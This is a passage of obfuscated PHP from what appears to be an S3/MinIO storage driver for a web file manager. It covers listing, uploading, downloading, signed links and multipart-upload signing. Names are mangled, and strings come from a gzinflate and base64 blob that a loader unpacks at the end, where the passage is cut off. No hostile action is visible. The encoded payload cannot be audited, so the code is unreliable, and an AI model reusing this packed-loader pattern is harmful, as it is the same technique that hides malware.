($¦ÔÑÎå) { return $¹èºˆ‘î; } $¹èºˆ‘î[$ÇèÛıºˆ[200]] = $¹èºˆ‘î[$ÇèÛıºˆ[85]] = 0; $¹èºˆ‘î[$ÇèÛıºˆ[201]] = $¹èºˆ‘î[$ÇèÛıºˆ[202]] = !0; if (empty($ìĞ¿Âë“)) { $ìĞ¿Âë“ = $this->objectMeta($å¥Í©Ûü); if (!$ìĞ¿Âë“) { return $¹èºˆ‘î; } } if (isset($ìĞ¿Âë“[$ÇèÛıºˆ[203]])) { $¹èºˆ‘î[$ÇèÛıºˆ[85]] = $ìĞ¿Âë“[$ÇèÛıºˆ[203]]; } if (isset($ìĞ¿Âë“[$ÇèÛıºˆ[76]])) { $¹èºˆ‘î[$ÇèÛıºˆ[76]] = $ìĞ¿Âë“[$ÇèÛıºˆ[76]]; } return $¹èºˆ‘î; } private function folderInfo($îØ¬—Â, $´œ ”å© = false, $İ¾ÉÊ = array()) { $¯‡à–ûğ =& $_SERVER[™¾ÇÙ¯¹]; $ÈÚ³‰ôÀ = array($¯‡à–ûğ[32] => $this->pathThis($îØ¬—Â), $¯‡à–ûğ[84] => $this->getPathOuter($¯‡à–ûğ[8] . $îØ¬—Â), $¯‡à–ûğ[33] => $¯‡à–ûğ[75]); if ($´œ ”å©) { return $ÈÚ³‰ôÀ; } $ÈÚ³‰ôÀ[$¯‡à–ûğ[200]] = $ÈÚ³‰ôÀ[$¯‡à–ûğ[85]] = 0; $ÈÚ³‰ôÀ[$¯‡à–ûğ[201]] = $ÈÚ³‰ôÀ[$¯‡à–ûğ[202]] = !0; if ($îØ¬—Â == $¯‡à–ûğ[12]) { return $ÈÚ³‰ôÀ; } if (empty($İ¾ÉÊ)) { $İ¾ÉÊ = $this->objectMeta(trim($îØ¬—Â, $¯‡à–ûğ[8]) . $¯‡à–ûğ[8]); } if (isset($İ¾ÉÊ[$¯‡à–ûğ[203]])) { $ÈÚ³‰ôÀ[$¯‡à–ûğ[200]] = $İ¾ÉÊ[$¯‡à–ûğ[203]]; } return $ÈÚ³‰ôÀ; } private function fileList($Œ¬¯êá‘, $âÆê˜‡Ù = '', $ò£‰Â¥› = 0) { $€Ò­ =& $_SERVER[™¾ÇÙ¯¹]; $ÑƒâÓË¦ = rtrim($Œ¬¯êá‘, $€Ò­[8]) . $€Ò­[8]; $¤èÓŠÛ = $this->listObjs($ÑƒâÓË¦, null, null, $âÆê˜‡Ù); if (!$¤èÓŠÛ) { return array($€Ò­[82] => array(), $€Ò­[83] => array()); } $—½§œÌô = $œ”Ë‰åÊ = array(); foreach ($¤èÓŠÛ[$€Ò­[204]] as $Æ½ÆÍĞö) { $ËñÈÀè = $Æ½ÆÍĞö[$€Ò­[32]]; if ($ËñÈÀè == $ÑƒâÓË¦) { continue; } $Ôà–¸Ü¹ = isset($Æ½ÆÍĞö[$€Ò­[76]]) ? $Æ½ÆÍĞö[$€Ò­[76]] : 0; $ÛÅï½­Š = $Ôà–¸Ü¹ == 0 && substr($ËñÈÀè, strlen($ËñÈÀè) - 1, 1) == $€Ò­[8] ? !0 : !1; $this->cacheMethodInfoSet($ËñÈÀè, $ÛÅï½­Š, $Æ½ÆÍĞö); if ($ÛÅï½­Š) { $—½§œÌô[] = $ËñÈÀè; continue; } $œ”Ë‰åÊ[] = $ò£‰Â¥› ? $Æ½ÆÍĞö : $ËñÈÀè; } foreach ($¤èÓŠÛ[$€Ò­[205]] as $Æ½ÆÍĞö) { $—½§œÌô[] = $Æ½ÆÍĞö[$€Ò­[32]]; $this->cacheMethodInfoSet($Æ½ÆÍĞö[$€Ò­[32]], !0); } $this->cacheMethodInfoSet($Œ¬¯êá‘, !0); return array($€Ò­[82] => $—½§œÌô, $€Ò­[83] => $œ”Ë‰åÊ); } private function listObjs($ò‹°Œ“Ó, $õ­öìß½ = null, $¦Âœäà = null, $³³æÀô = null) { $äô°ÁÄ =& $_SERVER[™¾ÇÙ¯¹]; $ò‹°Œ“Ó = trim($ò‹°Œ“Ó, $äô°ÁÄ[8]); $ƒ„àıë¨ = empty($ò‹°Œ“Ó) && $ò‹°Œ“Ó !== $äô°ÁÄ[197] ? $äô°ÁÄ[12] : $ò‹°Œ“Ó . $äô°ÁÄ[8]; return $this->client->getBucket($this->bucket, $ƒ„àıë¨, $õ­öìß½, $¦Âœäà, $³³æÀô, !0); } public function has($Í„½õÔæ, $à‚²­ø = false, $Éê¯çÃß = true) { $ÁÅ¯¦Ë =& $_SERVER[™¾ÇÙ¯¹]; $Í„½õÔæ = trim($Í„½õÔæ, $ÁÅ¯¦Ë[8]); $º¥Š’†ò = empty($Í„½õÔæ) && $Í„½õÔæ !== $ÁÅ¯¦Ë[197] ? $ÁÅ¯¦Ë[12] : $Í„½õÔæ . $ÁÅ¯¦Ë[8]; $‰ü´ü®‰ = null; $ó‡ŸÛ = 500; $Øø©è”™ = $ÁÅ¯¦Ë[8]; $£Éù–À = $ĞÊ€ÇÌÓ = array(); while (!0) { $ª¼¤­ = $this->listObjs($Í„½õÔæ, $‰ü´ü®‰, $ó‡ŸÛ, $Øø©è”™); if (!$ª¼¤­) { break; } $‰ü´ü®‰ = $ª¼¤­[$ÁÅ¯¦Ë[206]]; $–şâışŞ = $ª¼¤­[$ÁÅ¯¦Ë[204]]; $¶¸—’ªİ = $ª¼¤­[$ÁÅ¯¦Ë[205]]; if (empty($–şâışŞ) && empty($¶¸—’ªİ)) { break; } if (count($–şâışŞ) == 1 && $–şâışŞ[0][$ÁÅ¯¦Ë[32]] == $º¥Š’†ò) { break; } if ($à‚²­ø) { if (count($–şâışŞ)) { $–şâışŞ = array_column($–şâışŞ, $ÁÅ¯¦Ë[32]); $£Éù–À = array_merge($£Éù–À, $–şâışŞ); } if (count($¶¸—’ªİ)) { $¶¸—’ªİ = array_column($¶¸—’ªİ, $ÁÅ¯¦Ë[32]); $ĞÊ€ÇÌÓ = array_merge($ĞÊ€ÇÌÓ, $¶¸—’ªİ); } if ($‰ü´ü®‰ === null) { break; } continue; } if ($Éê¯çÃß) { if (!empty($–şâışŞ)) { if (count($–şâışŞ) > 1 || isset($–şâışŞ[0][$ÁÅ¯¦Ë[32]]) && $–şâışŞ[0][$ÁÅ¯¦Ë[32]] != $º¥Š’†ò) { return !0; } } } else { if (!empty($¶¸—’ªİ)) { return !0; } } if ($‰ü´ü®‰ === null) { break; } } if ($à‚²­ø) { $£Éù–À = array_diff($£Éù–À, array($º¥Š’†ò)); $£Éù–À = count(array_unique($£Éù–À)); $ĞÊ€ÇÌÓ = count(array_unique($ĞÊ€ÇÌÓ)); return array($ÁÅ¯¦Ë[207] => $£Éù–À, $ÁÅ¯¦Ë[208] => $ĞÊ€ÇÌÓ); } return !1; } public function listAll($ƒœ±Áú) { $ßŸ©‹Ë =& $_SERVER[™¾ÇÙ¯¹]; $ÕµÅ£Ğİ = $this->fileList($ƒœ±Áú, $ßŸ©‹Ë[12], !0); $ÊÍè¼Ä = array(); foreach ($ÕµÅ£Ğİ[$ßŸ©‹Ë[83]] as $‘ˆå‡›Ë) { $ÊÍè¼Ä[$‘ˆå‡›Ë[$ßŸ©‹Ë[32]]] = $‘ˆå‡›Ë[$ßŸ©‹Ë[76]]; } foreach ($ÕµÅ£Ğİ[$ßŸ©‹Ë[82]] as $‘ˆå‡›Ë) { if (is_string($‘ˆå‡›Ë)) { $ÊÍè¼Ä[$‘ˆå‡›Ë] = 0; } } return $this->listAllFiles($ƒœ±Áú, array_keys($ÊÍè¼Ä), $ÊÍè¼Ä); } public function canRead($Ùš¯Í™Ê) { $ÑÈÍ¢ñ =& $_SERVER[™¾ÇÙ¯¹]; $¼“üÆâ = $this->client->getAccessControlPolicy($this->bucket, $Ùš¯Í™Ê); if (!$¼“üÆâ) { return !1; } return in_array($¼“üÆâ, array($ÑÈÍ¢ñ[209], $ÑÈÍ¢ñ[210], $ÑÈÍ¢ñ[211])) ? !0 : !1; } public function canWrite($ß³öÆ·œ) { $Ü‰±ô„† =& $_SERVER[™¾ÇÙ¯¹]; $™ĞÑÆ‰ı = $this->client->getAccessControlPolicy($this->bucket, $ß³öÆ·œ); if (!$™ĞÑÆ‰ı) { return !1; } return in_array($™ĞÑÆ‰ı, array($Ü‰±ô„†[209], $Ü‰±ô„†[210])) ? !0 : !1; } public function getContent($ Ú§Ÿå¯) { return $this->client->getObject($this->bucket, $ Ú§Ÿå¯); } public function setContent($äŠòÊîÚ, $¶Ø·àÁ = '', $è²³ıÉ” = false) { $Ç¡û®æ =& $_SERVER[™¾ÇÙ¯¹]; $äŠòÊîÚ = $è²³ıÉ” ? trim($äŠòÊîÚ, $Ç¡û®æ[8]) . $Ç¡û®æ[8] : $äŠòÊîÚ; $·“§ãğ = get_file_mime(get_path_ext($äŠòÊîÚ)); $Ğ±ø¼ºµ = $this->client->putObject($¶Ø·àÁ, $this->bucket, $äŠòÊîÚ, $Ç¡û®æ[198], array(), $·“§ãğ); if (!$Ğ±ø¼ºµ) { return !1; } if ($è²³ıÉ”) { return !0; } $this->cacheMethod(null, null); $Ğ±ø¼ºµ = $this->copyFile($äŠòÊîÚ, $äŠòÊîÚ, array($Ç¡û®æ[212] => $Ğ±ø¼ºµ[$Ç¡û®æ[213]])); return $Ğ±ø¼ºµ ? !0 : !1; } public function fileSubstr($Ô¤…ÑŒ, $Ï„ê…Öğ, $†°ŒàÜÏ) { $éİÇ”â˜ = $Ï„ê…Öğ + $†°ŒàÜÏ - 1; return $this->client->getObject($this->bucket, $Ô¤…ÑŒ, array($_SERVER[™¾ÇÙ¯¹][214] => "\142\171\164\145\x73\x3d{$Ï„ê…Öğ}\x2d{$éİÇ”â˜}")); } public function upload($…©Åöİ¢, $µşü¿, $ëÙõ‡–Ñ = false, $ÇÕ±®£ò = REPEAT_REPLACE) { $¯ØŠØŠĞ =& $_SERVER[™¾ÇÙ¯¹]; $ãŒŸ„¥ = array($¯ØŠØŠĞ[212] => @md5_file($µşü¿)); $Šî²¹‰ = array($¯ØŠØŠĞ[215] => get_file_mime(get_path_ext($…©Åöİ¢))); if (IO::size($µşü¿) <= 1024 * 1024 * 200) { $™–Åê÷¹ = $this->client->putObjectFile($µşü¿, $this->bucket, $…©Åöİ¢, $¯ØŠØŠĞ[198], $ãŒŸ„¥, $Šî²¹‰); return !empty($™–Åê÷¹) ? $this->getPathOuter($…©Åöİ¢) : !1; } $Ø¯Ïç¦Ù = $this->client->multiUploadObject($µşü¿, $this->bucket, trim($…©Åöİ¢, $¯ØŠØŠĞ[8]), $ãŒŸ„¥, $Šî²¹‰); return $Ø¯Ïç¦Ù ? $this->getPathOuter($…©Åöİ¢) : !1; } public function download($®İßî¾, $Àá·Ç¡ñ) { if (!@is_dir($this->pathFather($Àá·Ç¡ñ)) && !IO::mkdir($this->pathFather($Àá·Ç¡ñ))) { return !1; } $’ñŠÚ’ = $this->client->getObject($this->bucket, $®İßî¾, array(), $Àá·Ç¡ñ); return $’ñŠÚ’ !== !1 ? $Àá·Ç¡ñ : !1; } public function link($Ù‰æà¤, $òÜì¤ÖÏ = array()) { $ˆˆ¶­¾ =& $_SERVER[™¾ÇÙ¯¹]; if ($this->signVer == $ˆˆ¶­¾[216]) { return $this->client->getAuthenticatedURL($this->bucket, $Ù‰æà¤, 3600 * 12, $òÜì¤ÖÏ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Ù‰æà¤, $ˆˆ¶­¾[8]), 3600 * 12, $this->region, array(), !0, $òÜì¤ÖÏ); } public function fileOut($şè¢ò¨, $¸ëò§™ = false, $Ä¿âàöú = false, $Ùì‰ğğ = '') { $œÂß©å =& $_SERVER[™¾ÇÙ¯¹]; if ($this->isFileOutServer()) { return $this->fileOutServer($şè¢ò¨, $¸ëò§™, $Ä¿âàöú, $Ùì‰ğğ); } if (!$Ä¿âàöú) { $Ä¿âàöú = $this->pathThis($şè¢ò¨); } $³†šÔºò = get_file_mime(get_path_ext($Ä¿âàöú)); if ($³†šÔºò == $œÂß©å[217]) { return parent::fileOut($şè¢ò¨, $¸ëò§™, $Ä¿âàöú, $Ùì‰ğğ); } $ÍÌ´¤£’ = array($œÂß©å[218] => $³†šÔºò); if ($¸ëò§™) { $ÍÌ´¤£’[$œÂß©å[219]] = $œÂß©å[220] . rawurlencode($Ä¿âàöú); } else { } $±‡ñ³Œ¸ = $this->link($şè¢ò¨, $ÍÌ´¤£’); $this->fileOutLink($±‡ñ³Œ¸); } public function fileOutServer($àè«à·â, $ÀÃŠü†„ = false, $¬ì‹Åº = false, $Ä¼ÆŠÖÉ = '') { parent::fileOut($àè«à·â, $ÀÃŠü†„, $¬ì‹Åº, $Ä¼ÆŠÖÉ); } public function fileOutImageServer($–Úı­Íú, $Îñ´Ê‰± = 250) { parent::fileOutImage($–Úı­Íú, $Îñ´Ê‰±); } public function hashMd5($Œä¤„ôá, $À¿ç‹ÁÊ = '') { $ôİ»ó¶ =& $_SERVER[™¾ÇÙ¯¹]; $ãã³Õå = $this->objectMeta($Œä¤„ôá); if (!$ãã³Õå) { return !1; } $À¿ç‹ÁÊ = $À¿ç‹ÁÊ ? $À¿ç‹ÁÊ : _get($ãã³Õå, $ôİ»ó¶[221]); $À¿ç‹ÁÊ = $À¿ç‹ÁÊ ? $À¿ç‹ÁÊ : _get($ãã³Õå, $ôİ»ó¶[213], $ôİ»ó¶[12]); return $À¿ç‹ÁÊ; } public function uploadFormData($ÄÕæğ«Ô, $ô†±÷«Æ = 3600) { $ìÂõÇû =& $_SERVER[™¾ÇÙ¯¹]; $–ö‡ÚÛ„ = $this->pathFather($ÄÕæğ«Ô); $§”¼ ä = $this->client->getHttpUploadPostParams($this->bucket, $–ö‡ÚÛ„, $ìÂõÇû[198], $ô†±÷«Æ); return array_merge((array) $§”¼ ä, array($ìÂõÇû[181] => $this->getHost())); } public function multiUploadFormData($×”µõ‘Á, $·Õü÷÷ = 3600) { $óªÙÖ´® =& $_SERVER[™¾ÇÙ¯¹]; $çöÁè±  = gmdate($óªÙÖ´®[222]); $€«Ş¹ = array(); $ø¹áê²ê = $this->client->getUploadId($this->bucket, $×”µõ‘Á, $€«Ş¹); if (!$ø¹áê²ê) { return !1; } return array($óªÙÖ´®[223] => $ø¹áê²ê, $óªÙÖ´®[181] => $this->getHost() . $óªÙÖ´®[8] . $this->pathEncode($×”µõ‘Á), $óªÙÖ´®[224] => $çöÁè± , $óªÙÖ´®[94] => $×”µõ‘Á); } public function multiUploadAuthData($ÀŞù´«ï, $şãù½Íñ = array()) { $Êï®€èÓ =& $_SERVER[™¾ÇÙ¯¹]; $Ìğá§Á› = isset($şãù½Íñ[$Êï®€èÓ[224]]) ? $şãù½Íñ[$Êï®€èÓ[224]] : gmdate($Êï®€èÓ[222]); $‡‰©ØŸ¿ = isset($şãù½Íñ[$Êï®€èÓ[174]]) ? $şãù½Íñ[$Êï®€èÓ[174]] : $Êï®€èÓ[12]; $ÅÈ”ç¥¡ = $şãù½Íñ[$Êï®€èÓ[94]]; unset($şãù½Íñ[$Êï®€èÓ[94]]); if (isset($şãù½Íñ[$Êï®€èÓ[225]])) { $şãù½Íñ[$Êï®€èÓ[224]] = $Ìğá§Á›; return $this->listUploadParts($ÅÈ”ç¥¡, $şãù½Íñ); } $’«®ÍÎ· = array($Êï®€èÓ[226], $Êï®€èÓ[12], $Êï®€èÓ[120], $Êï®€èÓ[12], "\x78\55\141\x6d\172\55\144\x61\x74\x65\72{$Ìğá§Á›}", $Êï®€èÓ[8] . $this->bucket . $Êï®€èÓ[8] . $this->pathEncode($ÅÈ”ç¥¡) . $‡‰©ØŸ¿); if (strpos($‡‰©ØŸ¿, $Êï®€èÓ[227]) === 0) { $’«®ÍÎ·[0] = $Êï®€èÓ[228]; } if (isset($şãù½Íñ[$Êï®€èÓ[229]]) && $şãù½Íñ[$Êï®€èÓ[229]] == $Êï®€èÓ[230]) { $’«®ÍÎ·[0] = $Êï®€èÓ[230]; } $åµ€÷Úá = implode($Êï®€èÓ[231], $’«®ÍÎ·); $³–¿¥« = base64_encode(hash_hmac($Êï®€èÓ[232], $åµ€÷Úá, $this->secret, !0)); $÷¹˜¢²Ì = $Êï®€èÓ[233] . $this->accessKey . $Êï®€èÓ[4] . $³–¿¥«; if (strpos($‡‰©ØŸ¿, $Êï®€èÓ[227]) === 0) { return array($Êï®€èÓ[234] => $÷¹˜¢²Ì, $Êï®€èÓ[224] => $Ìğá§Á›); } return $÷¹˜¢²Ì; } public function listUploadParts($âğ×è, $¶ùòÔ¢“ = array()) { $õ¤ä•ã =& $_SERVER[™¾ÇÙ¯¹]; $‰ ´ãú¾ = str_replace($õ¤ä•ã[235], $õ¤ä•ã[12], $¶ùòÔ¢“[$õ¤ä•ã[174]]); $Ô¸ÊÙù» = $this->client->listParts($this->bucket, $âğ×è, $‰ ´ãú¾); if (!$Ô¸ÊÙù») { return !1; } unset($¶ùòÔ¢“[$õ¤ä•ã[225]], $¶ùòÔ¢“[$õ¤ä•ã[229]]); $¶ùòÔ¢“[$õ¤ä•ã[94]] = $âğ×è; $ôô†Å‚Ü = $this->multiUploadAuthData($âğ×è, $¶ùòÔ¢“); if (empty($ôô†Å‚Ü)) { return !1; } return array($õ¤ä•ã[234] => $ôô†Å‚Ü, $õ¤ä•ã[224] => $¶ùòÔ¢“[$õ¤ä•ã[224]], $õ¤ä•ã[236] => $Ô¸ÊÙù»); } public function getHost() { return parent::getHost() . $_SERVER[™¾ÇÙ¯¹][8] . $this->bucket; } public function size($ÆÍÍç’ß) { $¤ìåàĞÇ = $this->objectMeta($ÆÍÍç’ß); return $¤ìåàĞÇ ? $¤ìåàĞÇ[$_SERVER[™¾ÇÙ¯¹][76]] : 0; } public function info($·ß¬Î½›) { if ($this->isFolder($·ß¬Î½›)) { return $this->folderInfo($·ß¬Î½›); } else { if ($this->isFile($·ß¬Î½›)) { return $this->fileInfo($·ß¬Î½›); } } return !1; } public function exist($ŠÚ”ışš) { return $this->isFile($ŠÚ”ışš) || $this->isFolder($ŠÚ”ışš); } public function isFile($ «È‡ûô) { return !$this->isFolder($ «È‡ûô) && $this->objectMeta($ «È‡ûô); } public function isFolder($ÃÕä©Œñ) { return $this->cacheMethod($_SERVER[™¾ÇÙ¯¹][165], $ÃÕä©Œñ); } protected function objectMeta($Ï··ñ·ê) { return $this->cacheMethod($_SERVER[™¾ÇÙ¯¹][167], $Ï··ñ·ê); } protected function _objectMeta($óÆ¯¬æÓ) { $Íà¡ñµ’ =& $_SERVER[™¾ÇÙ¯¹]; $óÆ¯¬æÓ = rtrim($óÆ¯¬æÓ, $Íà¡ñµ’[8]); try { $âÑœŠÑ¦ = $this->client->getObjectInfo($this->bucket, $óÆ¯¬æÓ); if (!isset($âÑœŠÑ¦[$Íà¡ñµ’[221]]) && isset($âÑœŠÑ¦[$Íà¡ñµ’[237]])) { $âÑœŠÑ¦[$Íà¡ñµ’[221]] = $âÑœŠÑ¦[$Íà¡ñµ’[237]]; } } catch (Exception $Óñ’èØŒ) { $âÑœŠÑ¦ = !1; } if (!$âÑœŠÑ¦) { } return $âÑœŠÑ¦; } protected function _isFolder($ŞÛÆşŸÃ) { $€ùÔä·— =& $_SERVER[™¾ÇÙ¯¹]; $ŞÛÆşŸÃ = rtrim($ŞÛÆşŸÃ, $€ùÔä·—[8]); if ($ŞÛÆşŸÃ == $€ùÔä·—[12] || $ŞÛÆşŸÃ == $€ùÔä·—[8]) { return !0; } $ãÚ¾Àµ¯ = $this->client->getBucket($this->bucket, $ŞÛÆşŸÃ, null, 1); if (empty($ãÚ¾Àµ¯[$€ùÔä·—[204]])) { return !1; } $¶ ìÁ¤ = $ãÚ¾Àµ¯[$€ùÔä·—[204]][0][$€ùÔä·—[32]]; return stripos($¶ ìÁ¤, $ŞÛÆşŸÃ . $€ùÔä·—[8]) === 0 ? !0 : !1; if (substr($¶ ìÁ¤, -1) == $€ùÔä·—[8]) { return !0; } if (get_path_this($¶ ìÁ¤) == get_path_this($ŞÛÆşŸÃ)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¨î”×Éº) { parent::__construct($¨î”×Éº); $this->signatureVersion($_SERVER[™¾ÇÙ¯¹][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto EŒ’Šå·”Ô; cÌîŒ‹ÛÔ‡: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('mb7H2a+5'), base64_decode('rKqjsvHF')); $_SERVER[™¾ÇÙ¯¹] = explode("\174\1\174\5\174\4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x9\x78\x1b\xd5\xd5\x30\xc\x65\x29\xeb\x4b\xb\xb4\x65\x29\x30\x98\xa4\xb6\x63\x2d\xb6\xb3\x3b\x71\x82\x6c\xcb\xb6\x88\x6c\x19\x49\xce\x82\x6d".base64_decode('lJE0tsaWNPLMyLachDYsDSHsAQphb6Gk7JR9p7y0UChLoUDZt2y8bKVlKS3Q7y7n')."\56\63\222\341\375\237\377\173\236\57\117\22\315\75\167\277\367\334\163\317\71\367\334\163\357\177\372\336\55\133\337\132\275\363\352\335\126\357\172\301\233\27\234\167\371\23\364\233".base64_decode('/L8b/T5iwx47kT8HbDitpqZzzl513fucddsN6vXqDeoZkfATfwrt+9T1xwS3/eqJ').base64_decode('0radd9qx/YhZTSgxzdtEf5S8YSvahG7ZFgWkjPygPkS/9Tz99dOf3mjY1HKGrdGg')."\217\376\44\244\166\355\152\215\146\165\26\237\350\216\304\23\261\336\236\236\140\64\16\211\232\344\370\234\221\206\257\202\152\252\71\250\277\240\231\26\152\215\134\134\242\140\24\264"."\274\3\42\0\151\325\126\223\252\5\45\265\265\44\332\202\75\341\310\212\104\174\105\117\20\122\44\23\243\105\315\54\321\20\371\214\331\252\151\307\365\234\306\123\214\233\274\135"."\55\301\216\120\267\22\217\6\272\143\201\326\170\50\322\115\301\255\221\256\256\120\274\34\36\215\204\303\55\201\326\45\345\61\75\321\100\107\127\100\101\355\313\152\11\75\77\150".base64_decode('1CgracxKpZZ+tOtaNk0/8yprjl0qwFecf6FpyhezWRro5l9pbVAtZmG02uRAwdRz')."\52\353\364\22\255\304\241\364\103\55\332\206\236\117\321\100\160\302\66\125\1\107\155\115\241\211\326\362\120\124\54\30\16\266\306\25\334\100\245\75\32\351\122\140\22\162\252\145"."\x6b\xa6\xb2\xac\x33\x18\xd\x2a\xb8\xd1\xcd\xd5\xa4\xaf\xd5\xa\xe0\x4b\x37\x1a\xa\x25\x10\xe\x2b\x53\x95\x60\x6b\xb9\x2\x2b\x86\xe6\xa9\x50\x58\x24\xda\x16\x8c\x2a\x2d\x2b\x14\x31\x42\x29"."\43\227\63\362\76\124\12\232\111\133\152\152\60\32\245\37\36\100\357\160\10\117\32\4\42\355\355\261\40\17\101\347\216\15\243\226\314\4\374\164\204\322\203\131\73\61\246\146"."\213\14\115\107\350\157\65\374\300\257\141\1\352\216\352\171\275\10\150\12\105\30\6\137\126\360\121\144\251\65\6\321\322\360\221\103\371\15\130\171\150\31\216\321\317\346\105\364"."\167\1\44\112\46\160\234\146\332\11\55\237\62\322\172\36\26\353\142\100\72\325\316\264\231\72\112\100\303\203\106\66\315\276\55\175\22\272\62\250\147\265\356\142\116\116\302\203".base64_decode('qYyeTZtsfX1TShoM8+WK04pQAbWEr3R9sCTWm2UUzZQWQitC5OvhqRsgkWbbqHMw').base64_decode('NrrRW8gaajqmmbxrutGOMkaKtgwskmTthplrQ5QB6kerQu+tEDHC1kVaGjF/Td9a')."\357\327\3\175\107\243\377\152\201\364\365\103\233\62\132\66\233\320\46\64\130\70\271\364\154\213\15\206\337\112\352\171\77\202\320\140\50\222\310\250\126\246\53\75\73\101\162\61"."\212\232\326\46\174\205\114\1\126\65\137\310\375\16\304\306\103\327\155\330\101\211\56\147\215\224\232\225\273\110\277\63\266\135\210\151\371\64\36\11\350\212\61\236\47\43\125\320"."\64\110\324\346\121\322\112\227\262\102\351\154\322\233\54\226\61\227\345\137\254\167\34\146\161\240\75\301\246\63\75\110\77\222\154\133\250\202\12\165\213\120\70\261\74\325\102\41".base64_decode('q6dUWzfyfiNla7bXsk1NhRIDqZRmWd5WI2+bRtYbyGaNcW/E1If0fJMyA4gtikSL')."\332\213\11\140\23\254\324\252\5\12\106\24\134\315\214\346\242\75\350\235\307\126\40\117\155\252\171\153\120\63\275\101\130\31\115\12\152\54\247\202\54\131\233\156\25\14\113\307".base64_decode('zWtSVNtWUxlMQUTxzd+QXs9n9bxWljY4UdBNzWJtVTq64lAIKl3z9pjqUE5tUgrF')."\44\32\31\130\251\25\140\64\65\14\115\223\222\302\101\217\222\53\132\266\327\324\20\51\322\321\166\7\203\34\32\364\166\341\165\245\153\151\157\14\121\154\0\317\254\237\245\40"."\xd4\x51\x58\x1c\x85\x76\xc6\xe3\x3d\x89\x50\x3b\xda\x92\xbb\x83\x89\xae\x40\xbc\xb5\x13\x9a\x6d\xab\x43\xac\xcd\x61\x44\x87\x79\x91\xc\xb8\xdc\x8b\xd6\x17\x46\xae\x6e\xd4\x57\x1\xec\x31\xc6"."\x35\x13\x55\xdc\x52\x6a\x52\x46\x8c\x74\xd2\x98\xf0\xb1\x28\x9c\x38\x86\x8\xd\x4b\x8c\xa7\xbb\x60\x7b\xa3\x6a\x7e\x8\x8f\x4f\xb2\x64\x6b\x80\x82\xd6\xd8\x90\x73\xa0\xc3\x5a\x7e\xc8\xce\xb0".base64_decode('jLFgdGkwmohF2uPLAlHYzPMISyZYVbjorDeqpdHQp2yWTy3gUWNp8OLAc8Vi8YJh').base64_decode('ceFQBx6YNq+FEnnlVKzssJ7TcdttHkNGEu30HdAgP+lQc39mRk1/uq7Wi/6fUdvX')."\337\346\233\61\260\330\257\213\74\376\6\137\203\322\130\77\107\351\101\254\207\256\146\25\350\164\131\212\172\45\262\304\71\54\2\233\363\106\136\373\206\301\301\173\227\264\354\135"."\303\112\201\321\340\261\275\301\130\74\321\25\214\167\106\332\240\366\140\0\276\302\6\135\266\254\267\175\364\147\0\146\167\200\376\44\164\253\135\332\126\160\220\223\237\204\221\34"."\106\223\321\245\61\32\73\110\151\164\50\247\16\271\110\76\16\165\31\246\346\204\210\255\152\231\236\146\173\2\16\166\152\372\120\6\306\113\307\245\245\214\254\141\252\131\114\31"."\331\242\320\30\265\32\322\201\132\1\21\26\201\230\236\53\260\306\332\231\142\56\51\175\2\265\267\20\376\60\132\226\61\370\176\146\230\360\325\344\207\204\323\33\333\31\265\367"."\307\146\242\277\202\264\247\215\234\312\10\45\41\161\132\232\322\70\12\232\341\210\351\324\124\261\111\333\246\155\140\250\351\110\202\6\64\143\300\304\16\151\254\111\105\336\66\326"."\xca\xb4\x96\xd5\xd8\x68\x64\x34\xb6\x4d\xd4\x43\x32\xb4\xcd\xf1\xb1\x1a\xe4\x73\x86\xb8\x3d\x4\x15\xfb\xb3\x6e\x45\x51\x4e\x4c\xd4\x59\x78\x19\x66\x8f\x5\xc0\xe6\x49\xb3\x68\x87\x8a\x90\x19".base64_decode('F+EeUxvUYZHm0Yx0qeYI6w2aAYErOCDhUXtvOJxojXTHEUtNIcuioXiQ4W2gLRFo')."\355\341\33\257\230\121\110\200\11\114\371\356\101\41\143\215\320\160\324\34\277\330\346\20\305\56\30\171\113\363\246\40\207\140\275\313\242\322\142\27\0\72\43\166\16\327\146\60".strrev('\'*!zzÊ„ÍI`11‹ƒ\'¿Í±$F;ˆ$³<­åÄ¬çPŞ^ZŞ“sUá').base64_decode('YUhHEIB7sf1cBbYqsCzGCHMRpTf1SVV0aTFrD+tILiv4OWevvGLk452h7iWJrkhb')."\60\234\10\165\43\312\24\57\207\367\366\264\5\330\124\312\360\226\110\274\323\1\355\105\264\151\151\40\34\162\47\17\56\17\305\342\261\212\121\10\326\33\164\305\44\324\101\330"."\207\102\171\31\42\120\77\201\126\121\2\46\27\206\271\45\20\13\265\46\172\2\254\111\210\217\361\133\351\21\313\257\232\210\51\36\103\274\155\322\217\231\74\54\163\372\70\33"."\x34\xb\x16\x51\x46\x4b\x8d\x24\xd4\x24\xa2\x12\x8c\x0\x17\x31\xaf\x0\x42\x3\x60\x41\x4b\xa2\x27\x1a\x6c\xf\x2d\xe7\xc1\xf6\x50\x30\xdc\x16\x4b\xb4\x6\x5a\x3b\x83\x1c\xd8\x1d\xe8\x62\xfd"."\30\304\22\242\345\167\246\117\40\332\37\343\162\146\142\14\313\314\6\357\247\54\332\45\230\320\222\20\250\215\366\170\15\26\0\314\2\226\324\311\0\203\234\236\62\212\154\147".base64_decode('4vxtjvU3p8LaVtn+XUN/apVATLELCU6kkiX+SbrBwoiThfoV2IfKWpDAaVq0Qb49')."\124\6\4\6\155\276\13\271\302\150\216\105\34\102\214\0\121\11\40\4\45\210\2\325\350\150\205\233\166\200\65\147\120\210\343\211\110\117\60\32\300\302\174\142\131\64\322\335"."\x1\x19\xc6\x33\x1a\x6b\x40\x8\x86\xbf\x86\xf1\x7c\x20\xd3\xdb\x82\x4e\x22\x86\x4d\x65\xc2\x9d\x18\xf4\x61\x83\xd\xe5\x6a\xfa\xf3\x13\xfa\x83\x30\xa\x2a\xd7\xf2\x6c\xd4\x93\x78\xcb\x60\x9b"."\36\373\30\104\213\224\221\173\243\310\153\113\32\106\226\221\17\304\266\160\72\306\165\2\303\26\103\222\11\106\1\353\240\302\11\330\266\342\221\45\301\356\4\303\54\32\